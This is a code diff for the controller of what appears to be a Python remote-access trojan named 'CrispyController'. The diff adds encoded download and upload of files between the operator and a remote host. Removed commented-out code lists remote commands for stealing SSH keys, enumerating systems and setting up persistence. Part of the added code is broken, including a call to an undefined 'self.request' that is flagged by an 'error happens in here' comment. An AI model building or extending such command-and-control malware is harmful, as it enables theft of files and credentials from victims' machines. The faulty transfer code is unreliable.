@@ -1,7 +1,8 @@
-import logging
 import os
 import socket
 import sys
+
+from constants import BANNER, BUFFER_SIZE, EOF_STR
 
 class CrispyController:  
     def __init__(self, host, port, cipher):
@@ -26,10 +27,47 @@ class CrispyController:
             exit               - close down connection to remote host
         """
         return info
+    
+    def receiveFile(self, downFile):
+        if os.path.isfile(downFile):
+            return False 
+        else:   
+            try:
+                with open(downFile, 'wb') as f:
+                    while True:
+                        data = self.cipher.decode(self.sock.recv(BUFFER_SIZE))
+                          
+                        if not data:
+                            break
+                        elif EOF_STR in data: 
+                            f.write(data[:-8])
+                            break
+                        else:
+                            f.write(data)
+                return True
+            except IOError: 
+                return False
+     
+    def uploadFile(self, upFile):
+        if os.path.isfile(upFile):
+            try:
+                with open(upFile, 'rb') as f:
+                    while True:
+                        data = f.read(BUFFER_SIZE)
+         
+                        if not data:
+                            self.request.sendall(self.cipher.encode(EOF_STR)) #error happens in here
+                            break
+                        else:
+                            self.sock.sendall(self.cipher.encode(data))
+                return True
+            except IOError:
+                print "IOError"
+                return False
+        else:
+            return False
 
     def run(self):
-        from constants import BANNER, BUFFER_SIZE
-        
         try:
             self.sock.connect((self.host, self.port))
             print BANNER
@@ -41,6 +79,24 @@ class CrispyController:
                     print self.help_menu()
                 elif cmd == 'session':
                     pass
+                elif cmd.startswith('download'):
+                    saveMeFile = cmd[9:].split(' ')[1]
+                    print "[+] Downloading " + cmd[9:].split(' ')[0] + "..."
+                    self.sock.sendall(self.cipher.encode(cmd + "\n"))
+                     
+                    if self.receiveFile(saveMeFile):      
+                        print "[+] File transfer complete!\n"
+                    else:
+                        print "[!] File transfer failed.\n"
+                elif cmd.startswith('upload'):
+                    sendMeFile = cmd[7:].split(' ')[0]
+                    print "[+] Uploading " + sendMeFile + "..."
+                    self.sock.sendall(self.cipher.encode(cmd + "\n"))
+                      
+                    if self.uploadFile(sendMeFile):
+                        print "[+] File transfer complete!\n"
+                    else:
+                        print "[!] File transfer failed.\n"
                 elif cmd == 'exit' or cmd == 'quit':
                     self.sock.sendall(self.cipher.encode(cmd + "\n"))
                     self.sock.close()
@@ -53,78 +109,6 @@ class CrispyController:
             print "[!] Controller run() --> {0}".format(e)
         finally:
             sys.exit(0)
-
-# import os
-# import socket
-# import sys
-# 
-# from .encoders.mime import Mime
-# from .constants import *
-# 
-# TCP_IP, TCP_PORT = "localhost", 8080
-# PROMPT = "%s:%i>> " % (TCP_IP, TCP_PORT)
-# sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-# cipher = Mime()
-#     
-# def help_menu():
-#     info = """
-#     Remote commands:
-#         enum_os            - get operating system info
-#         enum_applications  - get a list of installed applications
-#         enum_drives        - get a list of drives
-#         enum_printers      - get a list of printers
-#         get_ssh_keys       - get any ssh keys
-#         download           - download [src absolute path] [dest absolute path]
-#         upload             - upload [src absolute path] [dest absolute path]
-#         enable_persistence - make py persistent through reboots
-#     Local commands:
-#         session            - show info about current session
-#         exit               - close down connection to remote host
-#     """
-#      
-#     return info
-# 
-# def receiveFile(downFile):
-#     if os.path.isfile(downFile):
-#         return False 
-#     else:   
-#         try:
-#             with open(downFile, 'wb') as f:
-#                 receiving = True
-#                 while receiving:
-#                     data = sock.recv(BUFFER_SIZE)
-#                     print data
-#                     if "EOF!EOF!" in data:
-#                         data = data[:-8]
-#                         receiving = False
-#                     data = cipher.decode(data)
-#                      
-#                     if not data:
-#                         break
-#                     elif "EOF!EOF!" in data: 
-#                         f.write(data[:-8])
-#                         receiving = False
-#                     else:
-#                         f.write(data)
-#             return True
-#         except IOError: 
-#             return False
-#  
-# def uploadFile(upFile):
-#     try:
-#         with open(upFile, 'rb') as f:
-#             while True:
-#                 data = f.read(BUFFER_SIZE)
-# 
-#                 if not data:
-#                     break
-#                 else:
-#                     sock.sendall(cipher.encode(data))        
-#         sock.sendall(cipher.encode("EOF!EOF!"))
-#         #have client send a 'complete' message back before we return True
-#         return True
-#     except IOError:
-#         return False
 # 
 # def spawn():
 #     try:
